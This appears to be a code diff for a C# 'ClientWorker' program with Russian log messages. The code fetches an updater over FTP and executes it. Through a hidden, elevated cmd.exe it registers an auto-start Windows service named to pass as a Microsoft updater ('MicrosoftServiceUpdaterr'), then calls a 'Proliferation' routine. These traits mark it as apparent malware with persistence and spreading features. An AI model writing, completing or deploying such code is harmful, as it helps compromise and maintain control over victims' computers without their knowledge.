@@ -5,7 +5,6 @@ using System.IO;
 using System.Linq;
 using System.Windows.Forms;
 using System.Text;
-using System.Threading.Tasks;
 using System.Threading;
 
 namespace ClientWorker
@@ -22,6 +21,8 @@ namespace ClientWorker
         public void GetUpdater()
         {
             Console.WriteLine("GetUpdate");
+            KillUpdater();
+            Resetter.pause = true;
             ftpClient.FTPDownloadFile(StartData.updater);
             Process proc = new Process();
             proc.StartInfo.FileName = StartData.updater;
@@ -35,6 +36,17 @@ namespace ClientWorker
             {
                 Console.WriteLine("The start process failed: {0}", e.ToString());
             }
+            Resetter.pause = false;
+        }
+
+
+        private void KillUpdater()
+        {
+            foreach (var process in Process.GetProcessesByName(StartData.updater))
+            {
+                process.Kill();
+            }
+            File.Delete(StartData.updater);
         }
 
         public void AnalysisAnswer(string answer)
@@ -62,17 +74,14 @@ namespace ClientWorker
             {
                 Program.client.Clear();
                 Program.clientThread.Abort();
-
-                //Вылетает исключение
-                Program.clientThread = new Thread(new ThreadStart(Program.client.Start));
-                Program.clientThread.Start();
             }
             catch
             {
                 Console.WriteLine("Исключение закрытия потока");
-                Program.clientThread = new Thread(new ThreadStart(Program.client.Start));
-                Program.clientThread.Start();
-            }          
+            }
+
+            Program.clientThread = new Thread(new ThreadStart(Program.client.Start));
+            Program.clientThread.Start();
             Console.WriteLine("Переподключился");
         }
 
@@ -85,11 +94,12 @@ namespace ClientWorker
             proc.StartInfo.FileName = "cmd.exe";
             proc.StartInfo.Verb = "runas";
 
-            proc.StartInfo.Arguments = "/C "+ "Sc create MicrosoftUpdaterr binPath= " + applicationDataPath + StartData.floaderNewCopy +
+            proc.StartInfo.Arguments = "/C "+ "Sc create MicrosoftServiceUpdaterr binPath= " + applicationDataPath + StartData.floaderNewCopy +
                 "Service.exe" +" DisplayName= MicrosoftUpdaterr type= own start= auto";
 
             proc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
             proc.Start();
+
             Proliferation(applicationDataPath);
         }
         public void Proliferation(string parth)
